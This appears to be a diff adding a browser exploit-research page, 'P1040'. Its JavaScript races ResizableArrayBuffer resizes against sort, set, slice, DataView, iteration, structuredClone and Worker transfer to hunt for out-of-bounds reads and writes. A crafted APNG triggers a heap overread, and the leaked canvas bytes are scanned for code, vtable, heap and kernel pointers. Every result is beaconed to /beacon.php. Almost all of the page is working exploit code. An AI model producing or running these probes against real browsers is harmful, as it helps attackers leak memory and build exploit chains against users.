@@ -1,0 +1,720 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1040</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#4ec9b0}.fail{color:#f44}.warn{color:#dcdcaa}.hit{color:#c084fc;font-weight:bold}
+</style></head><body><div id="hud"></div>
+<script>
+// === WATCHER ===
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function log(s){var d=document.getElementById('hud');if(d){var p=document.createElement('div');p.innerHTML=s;d.appendChild(p);d.scrollTop=d.scrollHeight}}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1040-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+log('<b>P1040: RAB Race Conditions + Fixed APNG Overread</b>');
+bn('BOOT','ts='+Date.now().toString(36));
+
+// ===== PHASE A: ResizableArrayBuffer edge cases =====
+(function phaseA(){
+  log('[A] ResizableArrayBuffer edge cases...');
+  var results = [];
+  try {
+    // A1: Basic RAB creation + TypedArray view after shrink
+    var rab = new ArrayBuffer(1024, {maxByteLength: 4096});
+    var u8 = new Uint8Array(rab);
+    // Fill with pattern
+    for(var i=0;i<1024;i++) u8[i] = i & 0xFF;
+
+    // Create views at different offsets
+    var view1 = new Uint8Array(rab, 0, 256);     // First 256 bytes
+    var view2 = new Uint8Array(rab, 512, 256);    // Middle 256 bytes
+    var view3 = new Uint8Array(rab, 768, 256);    // Last 256 bytes
+    var dv = new DataView(rab, 0, 1024);
+
+    // Read before shrink
+    var pre_v1_0 = view1[0];
+    var pre_v3_255 = view3[255];
+
+    // SHRINK: reduce to 512 bytes — view2 and view3 are now past the end
+    rab.resize(512);
+
+    // Try reading from views that are now OOB
+    var oob_reads = [];
+    try { var x = view2[0]; oob_reads.push('v2[0]='+x); } catch(e) { oob_reads.push('v2[0]:'+e.name); }
+    try { var x = view3[0]; oob_reads.push('v3[0]='+x); } catch(e) { oob_reads.push('v3[0]:'+e.name); }
+    try { var x = dv.getUint8(768); oob_reads.push('dv768='+x); } catch(e) { oob_reads.push('dv768:'+e.name); }
+
+    // Try WRITING to OOB views
+    var oob_writes = [];
+    try { view2[0] = 0xDE; oob_writes.push('v2w=ok'); } catch(e) { oob_writes.push('v2w:'+e.name); }
+    try { view3[0] = 0xBE; oob_writes.push('v3w=ok'); } catch(e) { oob_writes.push('v3w:'+e.name); }
+    try { dv.setUint8(768, 0xEF); oob_writes.push('dvw=ok'); } catch(e) { oob_writes.push('dvw:'+e.name); }
+
+    var shrinkRes = 'oob_r='+oob_reads.join(',')+' oob_w='+oob_writes.join(',');
+    bn('A-SHRINK', shrinkRes);
+    log('[A1] Shrink OOB: '+shrinkRes);
+
+    // A2: Grow back — do views see the new data?
+    rab.resize(2048);
+    var grow_reads = [];
+    try {
+      // After grow, old view2 offset (512) is valid again
+      var x = view2[0];
+      grow_reads.push('v2[0]='+x);
+      // Was it preserved from before shrink, or zeroed?
+      grow_reads.push('preserved='+(x === 0));  // 0x00 offset 512 = 0x00
+    } catch(e) { grow_reads.push('v2:'+e.name); }
+
+    // Write to grown area and read back through view
+    try {
+      var bigView = new Uint8Array(rab);
+      bigView[1500] = 0x42;
+      grow_reads.push('write1500=ok');
+      grow_reads.push('read1500='+bigView[1500]);
+    } catch(e) { grow_reads.push('grow_write:'+e.name); }
+
+    bn('A-GROW', grow_reads.join('|'));
+    log('[A2] Grow reads: '+grow_reads.join(' | '));
+
+  } catch(e) {
+    bn('A-ERR', e.name+':'+e.message);
+    log('[A] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE B: RAB sort() callback resize race =====
+(function phaseB(){
+  log('[B] RAB sort callback resize...');
+  try {
+    var hits = 0;
+    var staleReads = [];
+
+    for(var trial = 0; trial < 200; trial++) {
+      var rab = new ArrayBuffer(4096, {maxByteLength: 8192});
+      var ta = new Uint8Array(rab);
+      // Fill with recognizable pattern
+      for(var i=0;i<4096;i++) ta[i] = (i * 7 + 13) & 0xFF;
+
+      var arr = Array.from(ta);
+      var sortView = new Uint8Array(rab);
+      var callCount = 0;
+      var shrunk = false;
+
+      try {
+        // Sort with a comparator that shrinks the buffer mid-sort
+        arr.sort(function(a, b) {
+          callCount++;
+          if(callCount === 100 && !shrunk) {
+            shrunk = true;
+            try { rab.resize(256); } catch(e){}
+          }
+          return a - b;
+        });
+
+        // After sort, try reading past shrunk boundary
+        if(shrunk) {
+          try {
+            var stale = sortView[1000]; // Should be OOB after resize to 256
+            if(stale !== undefined && typeof stale === 'number') {
+              staleReads.push(trial+':'+stale);
+              hits++;
+            }
+          } catch(e){}
+        }
+      } catch(e){}
+    }
+
+    var sortRes = 'hits='+hits+'|'+staleReads.slice(0,10).join(',');
+    bn('B-SORT', sortRes);
+    log('[B] Sort resize: '+sortRes);
+    if(hits > 0) log('<span class="hit">[B] STALE READS AFTER SORT RESIZE!</span>');
+
+  } catch(e) {
+    bn('B-ERR', e.name+':'+e.message);
+    log('[B] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE C: RAB + TypedArray.prototype.set() during resize =====
+(function phaseC(){
+  log('[C] RAB set() during callback resize...');
+  try {
+    var hits = 0;
+    var anomalies = [];
+
+    for(var trial = 0; trial < 200; trial++) {
+      var src = new ArrayBuffer(2048, {maxByteLength: 4096});
+      var dst = new ArrayBuffer(4096, {maxByteLength: 8192});
+      var srcView = new Uint8Array(src);
+      var dstView = new Uint8Array(dst);
+
+      // Fill src with marker pattern
+      for(var i=0;i<2048;i++) srcView[i] = 0xAA;
+      // Fill dst with different marker
+      for(var i=0;i<4096;i++) dstView[i] = 0xBB;
+
+      // Create a Proxy-backed "array-like" that resizes during iteration
+      var callIdx = 0;
+      var proxyArr = new Proxy(srcView, {
+        get: function(target, prop) {
+          if(prop === 'length') return target.length;
+          var idx = Number(prop);
+          if(!isNaN(idx) && idx >= 0) {
+            callIdx++;
+            if(callIdx === 500) {
+              // Shrink destination mid-copy
+              try { dst.resize(256); } catch(e){}
+            }
+            return target[idx];
+          }
+          return target[prop];
+        }
+      });
+
+      callIdx = 0;
+      try {
+        dstView.set(proxyArr, 0);
+      } catch(e) {}
+
+      // Check if data was written past the shrunken boundary
+      try {
+        dst.resize(4096); // grow back
+        var oob = new Uint8Array(dst);
+        for(var i=256;i<512;i++) {
+          if(oob[i] === 0xAA) {
+            anomalies.push(trial+':oob_write_at_'+i);
+            hits++;
+            break;
+          }
+        }
+      } catch(e){}
+    }
+
+    var setRes = 'hits='+hits+'|'+anomalies.slice(0,10).join(',');
+    bn('C-SET', setRes);
+    log('[C] Set resize: '+setRes);
+    if(hits > 0) log('<span class="hit">[C] OOB WRITE DURING SET!</span>');
+
+  } catch(e) {
+    bn('C-ERR', e.name+':'+e.message);
+    log('[C] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE D: RAB structuredClone race =====
+(function phaseD(){
+  log('[D] RAB structuredClone transfer races...');
+  try {
+    var hits = 0;
+    var anomalies = [];
+
+    for(var trial = 0; trial < 100; trial++) {
+      var rab = new ArrayBuffer(4096, {maxByteLength: 8192});
+      var view = new Uint8Array(rab);
+      for(var i=0;i<4096;i++) view[i] = 0xCC;
+
+      // Transfer detaches the original
+      var clone = null;
+      try {
+        clone = structuredClone(rab, {transfer: [rab]});
+      } catch(e) {
+        anomalies.push(trial+':clone_err:'+e.name);
+        continue;
+      }
+
+      // rab should be detached now
+      try {
+        var x = view[0]; // Should throw on detached buffer
+        if(x !== undefined && typeof x === 'number') {
+          anomalies.push(trial+':detached_read='+x);
+          hits++;
+        }
+      } catch(e) {
+        // Expected: TypeError for detached buffer
+      }
+
+      // Check clone is valid
+      try {
+        var cloneView = new Uint8Array(clone);
+        if(cloneView[0] !== 0xCC) {
+          anomalies.push(trial+':clone_wrong='+cloneView[0]);
+        }
+      } catch(e){}
+    }
+
+    var cloneRes = 'hits='+hits+'|'+anomalies.slice(0,10).join(',');
+    bn('D-CLONE', cloneRes);
+    log('[D] Clone transfer: '+cloneRes);
+    if(hits > 0) log('<span class="hit">[D] READ AFTER TRANSFER DETACH!</span>');
+
+  } catch(e) {
+    bn('D-ERR', e.name+':'+e.message);
+    log('[D] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE E: RAB slice-during-resize =====
+(function phaseE(){
+  log('[E] RAB slice during valueOf resize...');
+  try {
+    var hits = 0;
+    var anomalies = [];
+
+    for(var trial = 0; trial < 200; trial++) {
+      var rab = new ArrayBuffer(4096, {maxByteLength: 8192});
+      var view = new Uint8Array(rab);
+      for(var i=0;i<4096;i++) view[i] = (i & 0xFF);
+
+      // Object with valueOf that resizes during slice
+      var evilStart = {
+        valueOf: function() {
+          try { rab.resize(256); } catch(e){}
+          return 0;
+        }
+      };
+      var evilEnd = {
+        valueOf: function() {
+          try { rab.resize(256); } catch(e){}
+          return 4096; // Past the shrunken size
+        }
+      };
+
+      try {
+        var sliced = rab.slice(evilStart, evilEnd);
+        // If slice used the old size but buffer shrank, we might get OOB data
+        if(sliced.byteLength > 256) {
+          anomalies.push(trial+':slice_len='+sliced.byteLength);
+          hits++;
+          // Check for stale heap data
+          var sv = new Uint8Array(sliced);
+          var nonZero = 0;
+          for(var i=256;i<sliced.byteLength;i++) {
+            if(sv[i] !== 0) nonZero++;
+          }
+          if(nonZero > 0) anomalies.push('stale_bytes='+nonZero);
+        }
+      } catch(e){}
+
+      // Reset for next trial
+      try { rab.resize(4096); } catch(e){}
+    }
+
+    var sliceRes = 'hits='+hits+'|'+anomalies.slice(0,10).join(',');
+    bn('E-SLICE', sliceRes);
+    log('[E] Slice resize: '+sliceRes);
+    if(hits > 0) log('<span class="hit">[E] SLICE OOB AFTER RESIZE!</span>');
+
+  } catch(e) {
+    bn('E-ERR', e.name+':'+e.message);
+    log('[E] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE F: RAB + DataView OOB after resize =====
+(function phaseF(){
+  log('[F] DataView OOB after RAB resize...');
+  try {
+    var hits = 0;
+    var anomalies = [];
+
+    for(var trial = 0; trial < 100; trial++) {
+      var rab = new ArrayBuffer(4096, {maxByteLength: 8192});
+      var view = new Uint8Array(rab);
+      for(var i=0;i<4096;i++) view[i] = (i * 3) & 0xFF;
+
+      // Create DataView with explicit byteLength covering full buffer
+      var dv = new DataView(rab, 0, 4096);
+
+      // Shrink buffer
+      rab.resize(512);
+
+      // Try reading past shrunken boundary via DataView
+      var oobReads = [];
+      for(var off = 512; off < 4096; off += 512) {
+        try {
+          var val = dv.getUint32(off, true);
+          oobReads.push(off+'=0x'+val.toString(16));
+          hits++;
+        } catch(e) {
+          // Expected: RangeError
+          if(off === 512) oobReads.push(off+':'+e.name);
+        }
+      }
+
+      // Try writing OOB
+      try {
+        dv.setUint32(2048, 0xDEADBEEF, true);
+        oobReads.push('oob_write=ok');
+        hits += 10; // Big signal
+      } catch(e) {
+        if(trial === 0) oobReads.push('write:'+e.name);
+      }
+
+      if(trial === 0) {
+        bn('F-DV', oobReads.join('|'));
+        log('[F] DataView OOB: '+oobReads.join(' | '));
+      }
+
+      // Reset
+      try { rab.resize(4096); } catch(e){}
+    }
+
+    bn('F-HITS', 'total='+hits);
+    if(hits > 0) log('<span class="hit">[F] DATAVIEW OOB READS/WRITES!</span>');
+    else log('[F] DataView properly bounds-checked after resize');
+
+  } catch(e) {
+    bn('F-ERR', e.name+':'+e.message);
+    log('[F] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE G: RAB + forEach/map/filter callback resize =====
+(function phaseG(){
+  log('[G] TypedArray iteration callback resize...');
+  try {
+    var results = [];
+
+    // G1: forEach with resize
+    var rab = new ArrayBuffer(2048, {maxByteLength: 4096});
+    var ta = new Uint8Array(rab);
+    for(var i=0;i<2048;i++) ta[i] = i & 0xFF;
+
+    var forEachVals = [];
+    var resized = false;
+    try {
+      ta.forEach(function(val, idx) {
+        if(idx === 500 && !resized) {
+          resized = true;
+          try { rab.resize(256); } catch(e){}
+        }
+        if(idx >= 256 && idx < 260 && resized) {
+          forEachVals.push(idx+':'+val);
+        }
+      });
+    } catch(e) {
+      forEachVals.push('err:'+e.name);
+    }
+    results.push('forEach='+forEachVals.join(','));
+
+    // G2: map with resize
+    rab.resize(2048);
+    for(var i=0;i<2048;i++) ta[i] = i & 0xFF;
+    resized = false;
+    var mapOob = false;
+    try {
+      var mapped = ta.map(function(val, idx) {
+        if(idx === 500 && !resized) {
+          resized = true;
+          try { rab.resize(256); } catch(e){}
+        }
+        if(idx >= 256 && resized && val !== 0) {
+          mapOob = true;
+        }
+        return val;
+      });
+      results.push('map_oob='+mapOob+'|mapped_len='+mapped.length);
+    } catch(e) {
+      results.push('map:'+e.name);
+    }
+
+    // G3: filter with resize
+    rab.resize(2048);
+    for(var i=0;i<2048;i++) ta[i] = i & 0xFF;
+    resized = false;
+    var filterOob = [];
+    try {
+      var filtered = ta.filter(function(val, idx) {
+        if(idx === 300 && !resized) {
+          resized = true;
+          try { rab.resize(128); } catch(e){}
+        }
+        if(idx >= 128 && resized) {
+          filterOob.push(idx+':'+val);
+        }
+        return val > 200;
+      });
+      results.push('filter_oob='+filterOob.length+'|filtered_len='+filtered.length);
+    } catch(e) {
+      results.push('filter:'+e.name);
+    }
+
+    var iterRes = results.join(' | ');
+    bn('G-ITER', iterRes);
+    log('[G] Iteration resize: '+iterRes);
+
+  } catch(e) {
+    bn('G-ERR', e.name+':'+e.message);
+    log('[G] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE H: RAB + Worker transfer race =====
+(function phaseH(){
+  log('[H] Worker transfer + resize race...');
+  try {
+    if(typeof Worker === 'undefined') {
+      bn('H-SKIP','no_workers');
+      log('[H] No Worker support');
+      return;
+    }
+
+    var workerCode = 'self.onmessage=function(e){var buf=e.data;try{var v=new Uint8Array(buf);var sum=0;for(var i=0;i<v.length;i++)sum+=v[i];self.postMessage({len:v.length,sum:sum,first:v[0],mid:v.length>100?v[100]:0})}catch(err){self.postMessage({err:err.name,msg:err.message})}};';
+    var blob = new Blob([workerCode], {type:'application/javascript'});
+    var workerUrl = URL.createObjectURL(blob);
+
+    var hits = 0;
+    var anomalies = [];
+    var done = 0;
+    var total = 50;
+
+    function tryOne(trial) {
+      var rab = new ArrayBuffer(4096, {maxByteLength: 8192});
+      var view = new Uint8Array(rab);
+      for(var i=0;i<4096;i++) view[i] = 0xDD;
+
+      var w = new Worker(workerUrl);
+      w.onmessage = function(e) {
+        var r = e.data;
+        if(r.err) {
+          if(trial < 3) anomalies.push(trial+':'+r.err);
+        } else {
+          if(r.first !== 0xDD && r.first !== 0) {
+            anomalies.push(trial+':first=0x'+r.first.toString(16));
+            hits++;
+          }
+        }
+        w.terminate();
+        done++;
+        if(done >= total) {
+          var workerRes = 'hits='+hits+'|trials='+total+'|'+anomalies.slice(0,10).join(',');
+          bn('H-WORK', workerRes);
+          log('[H] Worker transfer: '+workerRes);
+          if(hits > 0) log('<span class="hit">[H] WORKER TRANSFER ANOMALY!</span>');
+          URL.revokeObjectURL(workerUrl);
+          phaseI(); // Continue to APNG phase
+        }
+      };
+      w.onerror = function() {
+        done++;
+        w.terminate();
+        if(done >= total) {
+          bn('H-WORK', 'hits='+hits+'|worker_errors');
+          log('[H] Some workers errored, hits='+hits);
+          URL.revokeObjectURL(workerUrl);
+          phaseI();
+        }
+      };
+
+      // Race: resize while transferring
+      try { rab.resize(256); } catch(e){}
+      try {
+        w.postMessage(rab, [rab]);
+      } catch(e) {
+        // If transfer fails after resize, try different order
+        done++;
+        w.terminate();
+        if(done >= total) {
+          bn('H-WORK', 'hits='+hits+'|transfer_fail='+e.name);
+          phaseI();
+        }
+      }
+    }
+
+    for(var t = 0; t < total; t++) {
+      tryOne(t);
+    }
+
+  } catch(e) {
+    bn('H-ERR', e.name+':'+e.message);
+    log('[H] Error: '+e.message);
+    phaseI();
+  }
+})();
+
+// ===== PHASE I: FIXED APNG Overread =====
+function phaseI(){
+  log('[I] APNG heap overread (FIXED big-endian builder)...');
+  try {
+    // FIXED: w32 now writes BIG-ENDIAN as PNG spec requires
+    function crc32(buf){var c,t=new Uint32Array(256);for(var n=0;n<256;n++){c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c}c=0xFFFFFFFF;for(var i=0;i<buf.length;i++)c=t[(c^buf[i])&0xFF]^(c>>>8);return(c^0xFFFFFFFF)>>>0}
+    function w32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF]}
+    function w16be(v){return[(v>>>8)&0xFF,v&0xFF]}
+    function makeChunk(type,data){
+      var t=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];
+      var td=t.concat(Array.from(data));
+      var c=crc32(new Uint8Array(td));
+      var len=data.length;
+      return [(len>>>24)&0xFF,(len>>>16)&0xFF,(len>>>8)&0xFF,len&0xFF].concat(td,[(c>>>24)&0xFF,(c>>>16)&0xFF,(c>>>8)&0xFF,c&0xFF]);
+    }
+    function adler32(d){var a=1,b=0;for(var i=0;i<d.length;i++){a=(a+d[i])%65521;b=(b+a)%65521}return((b<<16)|a)>>>0}
+    function zlibStore(raw){
+      var bl=raw.length;
+      var out=[0x78,0x01];
+      for(var i=0;i<bl;i+=65535){
+        var end=Math.min(i+65535,bl);
+        var last=end===bl?1:0;
+        var len=end-i;
+        out.push(last,len&0xFF,(len>>8)&0xFF,(~len)&0xFF,((~len)>>8)&0xFF);
+        for(var j=i;j<end;j++)out.push(raw[j]);
+      }
+      var ad=adler32(raw);
+      out.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);
+      return out;
+    }
+
+    // Canvas 4096 wide, 8 rows tall, RGB (ct=2), 8-bit depth
+    var W = 4096, H = 8, frameW = 8;
+
+    var sig = [137,80,78,71,13,10,26,10];
+    // IHDR: width(4BE) height(4BE) bitdepth(1) colortype(1) compression(1) filter(1) interlace(1)
+    var ihdr = makeChunk('IHDR', w32be(W).concat(w32be(H),[8,2,0,0,0]));
+    // acTL: num_frames=2, num_plays=0(infinite)
+    var actl = makeChunk('acTL', w32be(2).concat(w32be(0)));
+    // fcTL frame 0: seq=0, full canvas, delay 100/1000
+    var fctl0 = makeChunk('fcTL', w32be(0).concat(w32be(W),w32be(H),w32be(0),w32be(0),w16be(100),w16be(1000),[0,0]));
+
+    // Frame 0 data: full W x H, all zeros (RGB: 3 bytes/pixel)
+    var row0 = [];
+    for(var y=0;y<H;y++){
+      row0.push(0); // filter byte
+      for(var x=0;x<W*3;x++) row0.push(0);
+    }
+    var idat = makeChunk('IDAT', zlibStore(row0));
+
+    // fcTL frame 1: seq=1, small frame (frameW x H), triggers overread
+    var fctl1 = makeChunk('fcTL', w32be(1).concat(w32be(frameW),w32be(H),w32be(0),w32be(0),w16be(100),w16be(1000),[0,0]));
+
+    // Frame 1 data: small (frameW x H), RGB
+    var row1 = [];
+    for(var y=0;y<H;y++){
+      row1.push(0); // filter byte
+      for(var x=0;x<frameW*3;x++) row1.push(0xAA);
+    }
+    var fdat1 = makeChunk('fdAT', w32be(2).concat(zlibStore(row1)));
+
+    var iend = makeChunk('IEND', []);
+    var all = sig.concat(ihdr, actl, fctl0, idat, fctl1, fdat1, iend);
+
+    var pngBlob = new Blob([new Uint8Array(all)], {type:'image/png'});
+    var pngUrl = URL.createObjectURL(pngBlob);
+
+    var img = new Image();
+    img.onload = function(){
+      log('[I] <span class="ok">APNG loaded! ' + img.width + 'x' + img.height + '</span>');
+      bn('I-LOAD', 'w='+img.width+'|h='+img.height);
+
+      var c = document.createElement('canvas');
+      c.width = W; c.height = H;
+      var ctx = c.getContext('2d');
+
+      // Wait for frame 1 animation
+      setTimeout(function(){
+        ctx.drawImage(img, 0, 0);
+        var px = ctx.getImageData(0, 0, W, H).data;
+        var bytes = px.length;
+
+        // Count non-zero bytes past the small frame area
+        var overreadStart = frameW * 4; // RGBA stride
+        var nonZero = 0;
+        var uniqueVals = {};
+        for(var i = overreadStart; i < W * 4; i++) {
+          if(px[i] !== 0) {
+            nonZero++;
+            var key = px[i];
+            uniqueVals[key] = (uniqueVals[key] || 0) + 1;
+          }
+        }
+
+        var totalBytes = bytes;
+        var overreadBytes = nonZero;
+        log('[I] Total=' + totalBytes + 'B, overread=' + overreadBytes + 'B, unique_vals=' + Object.keys(uniqueVals).length);
+        bn('I-OVER', 'total='+totalBytes+'|overread='+overreadBytes+'|unique='+Object.keys(uniqueVals).length);
+
+        if(nonZero > 0) {
+          log('<span class="hit">[I] APNG OVERREAD CONFIRMED! ' + overreadBytes + ' stale bytes</span>');
+
+          // Build uint64 view and scan for pointers
+          var buf = new ArrayBuffer(bytes);
+          var u8 = new Uint8Array(buf);
+          for(var i=0;i<bytes;i++) u8[i] = px[i];
+
+          var dv = new DataView(buf);
+          var codePtrs=[], vtPtrs=[], heapPtrs=[], kernPtrs=[];
+
+          for(var off = overreadStart; off + 7 < bytes; off += 8) {
+            var lo = dv.getUint32(off, true);
+            var hi = dv.getUint32(off + 4, true);
+            if(hi === 0 && lo === 0) continue;
+            if(hi === 0xFFFFFFFF) continue; // sentinel/mask
+
+            // Library code: 0x01-0x07xx
+            if(hi >= 1 && hi <= 7 && lo > 0x1000) {
+              codePtrs.push({off:off, hi:hi, lo:lo});
+            }
+            // Vtable region: 0x081B-0x087F
+            if(hi >= 0x081B && hi <= 0x087F) {
+              vtPtrs.push({off:off, hi:hi, lo:lo});
+            }
+            // Heap region: 0x0880+
+            if(hi >= 0x0880 && hi <= 0x088F) {
+              heapPtrs.push({off:off, hi:hi, lo:lo});
+            }
+            // Kernel: 0xFFFF8xxx+
+            if((hi & 0xFFFF8000) === 0xFFFF8000 && hi !== 0xFFFFFFFF) {
+              kernPtrs.push({off:off, hi:hi, lo:lo});
+            }
+          }
+
+          var ptrStr = 'code='+codePtrs.length+'|vt='+vtPtrs.length+'|heap='+heapPtrs.length+'|kern='+kernPtrs.length;
+          bn('I-PTRS', ptrStr);
+          log('[I] Pointers: ' + ptrStr);
+
+          if(codePtrs.length > 0) {
+            var c0 = codePtrs[0];
+            bn('I-CODE', 'n='+codePtrs.length+'|first=0x'+c0.hi.toString(16).padStart(4,'0')+c0.lo.toString(16).padStart(8,'0'));
+            log('<span class="hit">[I] CODE PTR: 0x'+c0.hi.toString(16)+c0.lo.toString(16).padStart(8,'0')+'</span>');
+          }
+          if(vtPtrs.length > 0) {
+            var v0 = vtPtrs[0];
+            bn('I-VT', 'n='+vtPtrs.length+'|first=0x'+v0.hi.toString(16).padStart(4,'0')+v0.lo.toString(16).padStart(8,'0'));
+          }
+          if(kernPtrs.length > 0) {
+            bn('I-KERN', 'n='+kernPtrs.length+'|first=0x'+kernPtrs[0].hi.toString(16)+kernPtrs[0].lo.toString(16).padStart(8,'0'));
+            log('<span class="hit">[I] KERNEL POINTER FOUND!</span>');
+          }
+        } else {
+          log('[I] <span class="warn">No overread data (0 non-zero bytes past frame)</span>');
+          bn('I-CLEAN', 'zero_overread');
+        }
+
+        URL.revokeObjectURL(pngUrl);
+
+        // Final beacon
+        bn('DONE', 'rab_shrink+grow+sort+set+clone+slice+dv+iter+worker+apng');
+        log('<b>[DONE] All P1040 phases complete</b>');
+      }, 400);
+    };
+
+    img.onerror = function(){
+      log('[I] <span class="fail">APNG image FAILED to load</span>');
+      bn('I-ERR', 'img_fail');
+      bn('DONE', 'apng_failed');
+      URL.revokeObjectURL(pngUrl);
+    };
+
+    img.src = pngUrl;
+
+  } catch(e) {
+    bn('I-ERR', e.name+':'+e.message);
+    log('[I] Error: '+e.message);
+    bn('DONE', 'apng_exception');
+  }
+}
+
+</script></body></html>
